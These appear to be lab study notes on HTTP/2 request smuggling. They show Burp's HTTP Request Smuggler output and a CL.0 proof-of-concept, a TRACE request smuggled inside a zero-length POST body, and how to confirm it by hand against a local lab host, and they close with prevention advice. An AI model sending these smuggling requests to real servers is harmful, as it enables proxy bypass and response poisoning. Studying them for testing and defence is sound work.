# Tools & Prevention

**Tools of the Trade**

- Request Smuggler (Burp)

```python
GET /index.php?param1=HelloWorld HTTP/2
Host: http2.htb
```

![image.png](Tools%20&%20Prevention/image.png)

This will open a new window that is most likely too large for your 
screen. Just leave everything in the default settings and press `Enter` to start the scan. Burp will then run a scan for a `CL.0` vulnerability in the background. This is the same as the type of `H2.CL` vulnerability discussed in the previous section. It is also called `CL.0` vulnerability since the CL header is set to 0 and the request body contains only the smuggled request.

We can see the result of the scan in `Extensions > Installed`. When selecting the `HTTP Request Smuggler` extension from the list, select the `Output` Tab at the bottom of the window. The result is printed to the UI and looks like this:

```
Queueing reuest scan: CL.0
Found issue: CL.0 desync: h2CL|TRACE /
Target: https://172.17.0.2
HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
Evidence:
======================================
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com

======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
```

Burp tells us that the web application is vulnerable to a `CL.0` vulnerability. It gives us a proof-of-concept request to verify the finding from the automated scan. Let's verify the result. To do so, we are going to use the following requests from the above output. Request 1:

```
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
```

```
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
```

Ensure that the `Update Content-Length` option is unchecked

![image.png](Tools%20&%20Prevention/image%201.png)

However, the second response is a `405` status code:

![image.png](Tools%20&%20Prevention/image%202.png)

This indicates that we successfully smuggled the `TRACE` request past the reverse proxy and influenced the second request, proving a request smuggling vulnerability with the help of the burp extension `HTTP Request Smuggler`.

---

## HTTP/2 Attacks Prevention

The main cause for the attacks described here is HTTP/2 downgrading. 
Reverse proxies should not rewrite HTTP/2 requests to HTTP/1.1. Instead,
 HTTP/2 should be implemented end-to-end such that no rewriting is 
required. The difference in the two protocol versions means that minor 
deviations from the specifications in the implementation of reverse 
proxy and web server software can cause vulnerabilities such as request 
smuggling. Proper configuration and implementation of HTTP/2 prevent 
these issues entirely.